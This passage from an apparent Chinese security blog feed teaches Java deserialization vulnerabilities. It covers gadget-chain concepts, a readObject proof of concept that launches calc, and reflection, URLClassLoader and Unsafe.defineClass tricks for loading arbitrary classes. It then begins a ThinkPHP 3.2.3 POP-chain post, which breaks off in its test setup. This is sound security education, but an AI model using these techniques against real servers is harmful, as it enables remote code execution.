接口是一个标记接口，它没有任何方法。实现了<code>Serializable</code>接口的类表示<strong>这些类的对象可以被序列化</strong>，即可以将对象转换为字节流以便在网络上传输或者将其保存到文件中。在Java中，对象的序列化和反序列化是一种常见的机制，用于持久化对象或在网络中传输对象。通过实现<code>Serializable</code>接口，Java虚拟机（JVM）可以对这些对象执行序列化和反序列化操作。</p></blockquote><p><img src="/post/c3110923/image-20240326154534496.png" alt="image-20240326154534496" style="zoom: 40%;"></p><p>当去掉这里的 <code>implements Serializable</code>再次执行序列化的语句就会报错，接口的函数是空的，说明不需要实现什么，但是需要标注代表该类是可以被序列化的</p></li><li><p>不参与序列化的标记（<strong>transient</strong>）</p><blockquote><p>在Java中，<code>transient</code>关键字用于标记类的成员变量，表示这些变量不参与对象的序列化过程。当一个对象被序列化时，其<code>transient</code>修饰的成员变量的值不会被保存到序列化数据中，而在反序列化时，这些成员变量会被初始化为其默认值。</p><p>这种行为的设计是出于安全和灵活性的考虑。有时候，某些对象的状态可能包含<strong>敏感信息或者不需要被序列化和持久化</strong>，使用<code>transient</code>关键字可以排除这些成员变量不被序列化。例如，密码字段、临时计算结果等通常都会被标记为<code>transient</code>。</p></blockquote><p>对name标记transient</p><p><img src="/post/c3110923/image-20240326155614913.png" alt="image-20240326155614913" style="zoom:50%;"></p><p>序列化和反序列化函数执行中都不会报错，但是反序列化执行的结果name的值为null</p><p><img src="/post/c3110923/image-20240326155840350.png" alt="image-20240326155840350" style="zoom: 50%;"></p></li></ul><h4 id="安全问题">安全问题</h4><p>当有序列化的对象传递到本台主机时，只要服务器端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力</p><p>这个安全问题涉及到 Java序列化的一个特性，即序列化数据中可以包含用于对象恢复的自定义逻辑。在Java 中，当一个类实现了 <code>java.io.Serializable</code> 接口并包含<code>private void readObject(ObjectInputStream in)</code> 和/或<code>private void writeObject(ObjectOutputStream out)</code>方法时，这些方法可以被用来自定义序列化和反序列化的过程。</p><p>攻击者可以利用这一特性来在服务器上执行恶意代码，原理如下：</p><ol type="1"><li>攻击者构造一个带有恶意逻辑的特制的序列化数据。</li><li>攻击者将这个序列化数据发送给一个服务器，服务器上的代码对这个数据进行反序列化。</li><li>在服务器端，当序列化数据被反序列化时，<code>readObject</code>方法会被调用，而攻击者可以在这个方法中嵌入恶意代码，从而在服务器上执行这些代码。</li></ol><p>这个问题的核心在于，Java的序列化机制允许在对象恢复时执行特定的代码，而这个特性可以被攻击者利用来在服务器端执行任意代码，从而造成严重的安全风险。</p><h6 id="可利用条件">可利用条件</h6><ul><li><p>共同条件：继承<code>Serializable</code></p><blockquote><p>这个条件是序列化攻击的前提条件之一。Java中的序列化和反序列化机制是建立在类实现 <code>Serializable</code>接口的基础上的。因此，为了利用序列化漏洞，对象必须实现<code>Serializable</code> 接口，以便进行序列化和反序列化操作。</p></blockquote></li><li><p>入口类source（重写<code>readObject</code>参数类型广泛，最好jdk自带）（例如：<code>Map类</code>）</p><blockquote><p><code>source</code>类是指在反序列化过程中执行的入口点，通常是一个包含<code>readObject</code>方法的类。攻击者可以在该方法中执行恶意代码。为了增加攻击的成功率，攻击者通常会寻找一些JDK 自带的类，因为这些类在很多情况下会被信任并且有更广泛的使用场景。</p></blockquote></li><li><p>调用链 gadget chain</p><blockquote><p>调用链指的是一系列的对象和方法调用，这些调用会在反序列化时被触发执行。攻击者会构造一个恶意的对象图，其中包含一些有漏洞的类，这些类会在反序列化时触发恶意操作。这些类和方法的组合构成了所谓的<code>gadget chain</code>。攻击者的目标是利用这个<code>gadget chain</code> 来实现攻击。</p></blockquote></li><li><p>执行类 sink（rce ssrf写文件等等）</p><blockquote><p>执行类指的是被攻击者利用 <code>gadget chain</code>中的漏洞触发执行的类或方法。这些类或方法通常会包含一些危险的操作，比如执行远程代码（RCE）、发起服务器端请求伪造（SSRF）、写文件等等。攻击者的目标就是利用<code>gadget chain</code> 最终达到执行这些危险操作的目的。</p></blockquote></li></ul><h6 id="可能的形式">可能的形式</h6><ul><li><p>入口类的 <code>readObject</code> 直接调用危险方法</p><blockquote><p>攻击者可以在序列化数据中包含一些触发恶意操作的指令，而这些指令会在<code>readObject</code> 方法中被执行。例如，攻击者可能会在<code>readObject</code> 中调用 <code>Runtime.exec()</code>方法来执行系统命令，或者执行其他敏感的操作，从而实现对服务器的攻击。</p></blockquote><p>比如直接在 <code>Person</code> 类中重写 <code>readObject()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次序列化然后反序列化，成功弹出了计算器</p><p><img src="/post/c3110923/image-20240326162006965.png" alt="image-20240326162006965" style="zoom: 15%;"></p></li><li><p>入口类的参数中包含可控类，该类有危险方法，<code>readObject</code> 时调用</p><blockquote><p>攻击者可以通过控制序列化数据中的某些类的内容，使得这些类在被反序列化时调用其中的危险方法。例如，攻击者可能构造一个特定的类，其中包含一个<code>finalize()</code>方法，在该方法中执行恶意代码。当这个类被反序列化时，<code>finalize()</code>方法会被自动执行，从而触发攻击。</p></blockquote></li><li><p>入口类的参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code> 时调用</p><blockquote><p>攻击者可能构造一个复杂的对象图，其中包含多个类，这些类之间存在调用关系。攻击者可以通过控制序列化数据中的这些类的内容，使得反序列化过程中执行危险方法。例如，攻击者可能控制一个类，该类在反序列化时调用其他类的危险方法，从而间接实现对服务器的攻击。</p></blockquote></li><li><p>构造函数/静态代码块等类加载时隐式执行</p><blockquote><p>在 Java中，类的构造函数和静态代码块在类加载时会被隐式执行。攻击者可以构造恶意类，其中包含有恶意代码的构造函数或静态代码块。当这些类被反序列化时，其构造函数或静态代码块会被执行，从而触发攻击。这种情况下，攻击者无需调用<code>readObject</code> 方法，而是利用类加载时的隐式执行来触发攻击。</p></blockquote></li></ul><h4 id="java反射和urldns链">Java反射和URLDNS链</h4><p>Reflection定义</p><blockquote><p>Java的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法;并且对于任意一个对象，都能够调用它的任意一个方法;这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p></blockquote><ul><li><p>正射：定义类，调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student.getId(<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>反射：<strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong>(把java类中的各种成分映射成一个个的Java对象)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过类的全限定名获取Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;reflection.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定方法对象，这里是获取名为getId，参数类型为String的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getId&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取无参构造函数对象</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过构造函数创建类的实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用实例的指定方法，这里是调用getId方法，并传递参数1</span></span><br><span class="line">method.invoke(object, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="reflection作用">Reflection作用</h5><ol type="1"><li><strong>让Java具有动态性</strong>：反射使Java可以在运行时加载和操作类，即使这些类在编译时是未知的。这在插件系统、依赖注入等场景非常有用。</li></ol><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设类名是通过配置文件或其他方式动态获取的</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.MyClass&quot;</span>;</span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出类名</span></span><br><span class="line">System.out.println(<span class="string">&quot;Class loaded: &quot;</span> + clazz.getName());</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><strong>解释</strong>：</p><ul><li>通过类的全限定名动态加载类。</li><li>可以根据配置文件或其他输入来决定加载哪个类，使程序更具动态性。</li></ul><ol start="2" type="1"><li><strong>修改已有对象的属性</strong>：反射可以用来访问和修改对象的私有属性。(下图实现了修改person对象的name值)</li></ol><p><img src="/post/c3110923/image-20240601152713619.png" alt="image-20240601152713619" style="zoom:33%;"><img src="/post/c3110923/image-20240601152516036.png" alt="image-20240601152516036" style="zoom:40%;"></p><p><strong>解释</strong>：</p><ul><li>获取私有属性的<code>Field</code>对象。</li><li>将属性设置为可访问（即使是私有的）。</li><li>修改属性的值。</li></ul><ol start="3" type="1"><li><strong>动态生成对象</strong>：通过反射可以动态创建对象实例。</li></ol><p><img src="/post/c3110923/image-20240601152819556.png" alt="image-20240601152819556" style="zoom:40%;"><img src="/post/c3110923/image-20240601152844874.png" alt="image-20240601152844874" style="zoom:40%;"></p><p><strong>解释</strong>：</p><ul><li>通过<code>Class</code>对象获取构造函数。</li><li>使用构造函数动态创建对象实例。</li></ul><ol start="4" type="1"><li><strong>动态调用方法</strong>：通过反射可以在运行时调用对象的方法。</li></ol><p><img src="/post/c3110923/image-20240601153144217.png" alt="image-20240601153144217" style="zoom:33%;"><img src="/post/c3110923/image-20240601153215161.png" alt="image-20240601153215161" style="zoom:33%;"></p><p><strong>解释</strong>：</p><ul><li>通过<code>Class</code>对象获取方法对象。</li><li>使用方法对象调用方法，并传递参数。</li></ul><ol start="5" type="1"><li><strong>操作内部类和私有方法</strong>：反射可以用来操作内部类和私有方法。</li></ol><p><img src="/post/c3110923/image-20240601153559550.png" alt="image-20240601153559550" style="zoom:33%;"><img src="/post/c3110923/image-20240601153626409.png" alt="image-20240601153626409" style="zoom: 25%;"></p><p><strong>解释</strong>：</p><ul><li>获取内部类和私有方法的<code>Class</code>对象和<code>Method</code>对象。</li><li>动态创建内部类实例，并调用私有方法。</li></ul><h6 id="举例说明-1">举例说明</h6><ol type="1"><li><strong>结合参数创建新对象</strong>：直接使用<code>newInstance()</code> 是无法传参的，但是通过获取构造函数对象函数<code>getConstructor()</code>函数可以实现传参（思路：从具体实例对象获取类对象，再获取创建函数对象，再创建实例对象）</li></ol><p><img src="/post/c3110923/image-20240601155001867.png" alt="image-20240601155001867" style="zoom: 33%;"></p><ol start="2" type="1"><li><p><strong>获取类里面属性</strong>：<code>getFields</code>函数（输出public属性）和 <code>getDeclaredFields</code>函数（输出public+private属性）区别，这两个函数都是获取属性对象</p><p><img src="/post/c3110923/image-20240601155800809.png" alt="image-20240601155800809" style="zoom: 25%;"><img src="/post/c3110923/image-20240601155941697.png" alt="image-20240601155941697" style="zoom: 25%;"></p><p>输出</p><p><img src="/post/c3110923/image-20240601160022885.png" alt="image-20240601160022885" style="zoom: 33%;"><img src="/post/c3110923/image-20240601160034312.png" alt="image-20240601160034312" style="zoom:25%;"></p></li><li><p><strong>根据属性名获取变量参数</strong>：<code>getField</code>函数（public属性）和 <code>getDeclaredField</code>函数（public+private属性），这两个函数都是获取属性对象，改变值的时候需要指定要改变的实例对象，其中对于私有对象，反射的权限是很大的，所以只需要设置<code>setAccessible</code> 函数为true</p><p><img src="/post/c3110923/image-20240601160644555.png" alt="image-20240601160644555" style="zoom:33%;"><img src="/post/c3110923/image-20240601160503017.png" alt="image-20240601160503017" style="zoom: 50%;"></p></li><li><p><strong>调用类里面的方法</strong>：获取该方法调用的对象，同样分为<code>getMethods</code> 函数和 <code>getDeclaredMethods</code>函数，区别和获取属性一致</p><p><code>getMethod</code> 函数和 <code>getDeclaredMethod</code>函数获取单个方法对象，获取函数方法的时候，需要指明该函数需要传参的变量的类型，该函数方法在使用的时候（<code>invoke</code>）时，要指明执行该方法的实例对象</p><p><img src="/post/c3110923/image-20240601161405697.png" alt="image-20240601161405697" style="zoom:33%;"><img src="/post/c3110923/image-20240601161415478.png" alt="image-20240601161415478" style="zoom:50%;"></p></li></ol><h5 id="urldns链">URLDNS链</h5><h6 id="原理">原理</h6><p><code>HashMap</code> 类中存在 <code>readObject()</code>犯法，在该方法中有一句 <code>putVal(hash(key),***)</code></p><p><img src="/post/c3110923/image-20240601201044511.png" alt="image-20240601201044511" style="zoom:33%;"></p><p>再进入此处的 <code>hash</code> 方法，发现调用了 <code>key</code>变量的 <code>hashCode()</code> 方法</p><p><img src="/post/c3110923/image-20240601201344002.png" alt="image-20240601201344002" style="zoom:33%;"></p><p>此处将 <code>key</code> 设置为URL类，URL类中有<code>hashCode()</code>方法，且初始化为-1（也代表只有第一次调用该函数时，该对象的<code>hashCode</code>变量值为-1）</p><p><img src="/post/c3110923/image-20240601201416411.png" alt="image-20240601201416411" style="zoom:33%;"><img src="/post/c3110923/image-20240601201433945.png" alt="image-20240601201433945" style="zoom:33%;"></p><h4 id="jdk动态代理">JDK动态代理</h4><ol type="1"><li><p><strong>静态代理：</strong>创建一个对象，实现调用另一个对象的函数，同时可以独立记录日志等操作</p><p>示例如下，代码输出为：<code>show method in IUserImpl    show method in UserProxy</code></p><p><img src="/post/c3110923/image-20240602140015032.png" alt="image-20240602140015032" style="zoom:33%;"><img src="/post/c3110923/image-20240602140031652.png" alt="image-20240602140031652" style="zoom: 25%;"><img src="/post/c3110923/image-20240602140046252.png" alt="image-20240602140046252" style="zoom: 25%;"></p><p>缺点：接口实现了多少方法，代理里就需要添加多少方法（繁琐）</p></li><li><p><strong>动态代理</strong>：创建动态代理对象，重写<code>InvocationHandler</code> 类的 <code>invoke</code> 调用函数方法</p><p>示例如下，代码输出为<code>method: show is invoked  show method in IUserImpl</code></p><blockquote><p>每一个动态代理类的调用处理程序都必须实现<code>InvocationHandler</code>接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现<code>InvocationHandler</code>接口类的<code>invoke</code>方法来调用</p></blockquote><p><img src="/post/c3110923/image-20240602141852317.png" alt="image-20240602141852317" style="zoom:33%;"><img src="/post/c3110923/image-20240602141911736.png" alt="image-20240602141911736" style="zoom:33%;"></p></li></ol><h4 id="类的动态加载">类的动态加载</h4><p><strong>类加载流程：加载--验证--准备--解析--初始化（静态代码块被调用）--实例化（使用，构造代码块，无/有参构造函数）--卸载</strong></p><h5 id="示例">示例</h5><p><code>Person</code>类如下：</p><p><img src="/post/c3110923/image-20240602143013092.png" alt="image-20240602143013092" style="zoom:33%;"></p><ul><li><p>（使用）当输入代码 <code>new Person()</code> 输出为<code>静态代码块被调用了   构造代码块被调用了   无参构造方法被调用了</code></p></li><li><p>（使用）当输入代码<code>new Person("test", 18, "test", "test");</code> 输出为<code>静态代码块被调用了    构造代码块被调用了   有参构造方法被调用了</code></p></li><li><p>（使用）当输入代码 <code>Person.staticMethod();</code> 输出为<code>静态代码块被调用了    静态方法被调用了</code></p></li><li><p>（初始化）当输入代码 <code>Person.id = 1;</code> 输出为<code>静态代码块被调用了</code></p></li><li><p>（类加载）当输入代码 <code>Class clazz = Person.class;</code>无输出</p></li><li><p>（默认进行<u>初始化</u>）当输入代码<code>Class clazz = Class.forName("com.example.java_deserialization.Person");</code>输出为 <code>静态代码块被调用了</code></p></li><li><p>（不进行<u>初始化</u>）当输入代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class.forName(<span class="string">&quot;com.example.java_deserialization.Person&quot;</span>,<span class="literal">false</span>,cl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者是</span></span><br><span class="line"></span><br><span class="line">ClassLoader cl=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class c= cl.loadClass(<span class="string">&quot;com.example.java_deserialization.Person&quot;</span>);</span><br></pre></td></tr></table></figure><p>无输出</p></li><li><p>当输入代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class c=Class.forName(<span class="string">&quot;com.example.java_deserialization.Person&quot;</span>,<span class="literal">false</span>,cl);</span><br><span class="line">c.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者是</span></span><br><span class="line"></span><br><span class="line">ClassLoader cl=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class c= cl.loadClass(<span class="string">&quot;com.example.java_deserialization.Person&quot;</span>);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure><p>输出为<code>静态代码块被调用了    构造代码块被调用了   无参构造方法被调用了</code></p></li></ul><h6 id="结论">结论</h6><p>动态类加载方法： <code>Class.forName</code> 可以选择是否初始化</p><ol type="1"><li><strong>ClassLoader cl =ClassLoader.getSystemClassLoader();</strong><ul><li><code>ClassLoader</code> 是 Java 类加载器的基类，负责动态加载 Java类到 JVM 中。</li><li><code>getSystemClassLoader()</code> 是 <code>ClassLoader</code>类的静态方法，用来获取系统类加载器。系统类加载器通常是负责加载应用程序类路径（即<code>CLASSPATH</code> 环境变量指向的路径）下的类。</li></ul></li><li><strong>Class c =cl.loadClass("com.example.java_deserialization.Person");</strong><ul><li><code>loadClass(String name)</code> 是 <code>ClassLoader</code>的一个方法，用于加载指定类的字节码并返回 <code>Class</code> 对象。</li><li>这里 <code>name</code>参数是类的全限定名（即包含包名的完整类名），比如<code>com.example.java_deserialization.Person</code>。</li><li>调用<code>cl.loadClass("com.example.java_deserialization.Person")</code>会让类加载器加载 <code>Person</code> 类并返回对应的 <code>Class</code>对象。如果类已经被加载，这个方法会直接返回现有的 <code>Class</code>对象。</li></ul></li><li><strong>c.newInstance();</strong><ul><li><code>newInstance()</code> 是 <code>Class</code>类的方法，用于创建这个 <code>Class</code>对象所表示的类的一个新实例。这个方法要求 <code>Class</code>对象必须具有一个无参的构造方法。</li><li><code>c.newInstance()</code>相当于调用这个类的无参构造函数，并返回新创建的对象的引用。</li></ul></li></ol><h6 id="详细机理解释">详细机理解释</h6><ol type="1"><li><p>ClassLoader 工作原理</p><p>Java 的类加载器机制遵循双亲委派模型（parent delegationmodel），主要包括以下几个步骤：</p><ul><li><strong>检查缓存</strong>：检查类加载器的缓存，是否已经加载过该类，如果加载过直接返回类的<code>Class</code> 对象。</li><li><strong>委派给父类加载器</strong>：如果没有加载过，当前类加载器会先委派父类加载器去加载该类。每个类加载器都有一个父加载器，除了根加载器（BootstrapClassLoader）。</li><li><strong>自己加载</strong>：如果父加载器也没有加载过这个类，那么当前类加载器才会尝试自己去加载。</li></ul><p>系统类加载器 (<code>System ClassLoader</code>) 是 JVM提供的默认类加载器，通常是应用程序类加载器（<code>Application ClassLoader</code>），它负责加载<code>CLASSPATH</code> 下的类。</p></li><li><p>Class 加载过程</p><p>类加载过程可以分为以下几个阶段：</p><ul><li><p><strong>加载（Loading）</strong>：查找并导入类的二进制数据。</p></li><li><p>链接（Linking）</p><p>：</p><ul><li><strong>验证（Verification）</strong>：确保导入的类文件的字节码符合JVM 的规范。</li><li><strong>准备（Preparation）</strong>：为类的静态变量分配内存，并将其初始化为默认值。</li><li><strong>解析（Resolution）</strong>：将类、接口、字段、方法的符号引用替换为直接引用。</li></ul></li><li><p><strong>初始化（Initialization）</strong>：执行类构造器<code>&lt;clinit&gt;()</code>方法，初始化静态变量和静态代码块。</p></li></ul></li><li><p>Reflection 工作原理</p><p>反射机制允许在运行时操作类和对象。<code>Class</code>类提供了一些方法来获取类的信息以及创建类的实例：</p><ul><li><code>newInstance()</code>方法会调用类的无参构造方法创建一个新的对象实例。如果类没有无参构造方法或者构造方法不可访问（例如是<code>private</code> 的），调用 <code>newInstance()</code>会抛出异常。</li></ul></li></ol><p>底层的原理，实现加载任意的类</p><p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;APPClassLoader</p><p>loadClass-&gt;findClass（重写的方法）-&gt;defineClass(从字节码加载)</p><h6 id="可利用">可利用</h6><ol type="1"><li><p>利用URLClassLoader的加载类方法（传参类型为URL）加载类(file/http/jar)</p><ul><li><p>file:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;file:///D:\\java workforse\\java_deserialization\\&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;com.example.java_deserialization.Hello&quot;</span>);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure></li><li><p>http:先启动在class目录下使用<code>python -m http.server 8888</code>启动http服务，再使用http协议传递文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://localhost:8888/&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;com.example.java_deserialization.Hello&quot;</span>);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure></li></ul></li><li><p>利用defineClass，该类是Protect，只能用反射调用，字节码加载任意类，私有方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>(Class) defineClassMethod.invoke(cl, <span class="string">&quot;com.example.java_deserialization.Hello&quot;</span>, code,<span class="number">0</span>,code.length);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure></li><li><p>利用Unsafe类，实际利用的是Unsafe.defineClass，也是字节码加载任意类，public类，类不能直接生成，里面可以直接上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line"><span class="comment">//        Class c =(Class) defineClassMethod.invoke(cl, &quot;com.example.java_deserialization.Hello&quot;, code,0,code.length);</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line">Class unsafe= Unsafe.class;</span><br><span class="line">Field f=unsafe.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Unsafe u=(Unsafe)f.get(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) u.defineClass(<span class="string">&quot;com.example.java_deserialization.Hello&quot;</span>, code, <span class="number">0</span>, code.length, cl, <span class="literal">null</span>);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;java序列化和反序列化入门&quot;&gt;Java序列化和反序列化入门&lt;/h2&gt;
&lt;p&gt;参考视频：&lt;a href=&quot;https://www.bilibili.com/video/BV16h411z7o9/?share_source=weixin&amp;amp;vd_source=5ded3ec65465babadabcd69cfc28f3fe&quot;&gt;Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)_哔哩哔哩_bilibili&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp3_x(反序列化)</title>
    <link href="http://example.com/post/9bc8e8a9.html"/>
    <id>http://example.com/post/9bc8e8a9.html</id>
    <published>2024-03-20T09:39:50.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="thinkphp3_x反序列化">Thinkphp3_x(反序列化)</h4><p>参考链接：<a href="https://www.ctfiot.com/20632.html">ThinkPHP v3.2.*（SQL注入&amp;文件读取）反序列化POP链 | CTF导航 (ctfiot.com)</a></p><span id="more"></span><h5 id="环境">环境</h5><p>PHP5.6+Linux+ThinkPHP3.2.3</p><p>thinkphp5.0.24下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=3.2.3 tp3</span><br></pre></td></tr></table></figure><p>接着访问 <code>127.0.0.1/tp3</code>，框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的<code>Action</code> 即可。</p><h5 id="测试代码">测试代码</h5><p>在文件<code>Application/Home/Controller/IndexController.class.php</code>中替换为以下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; 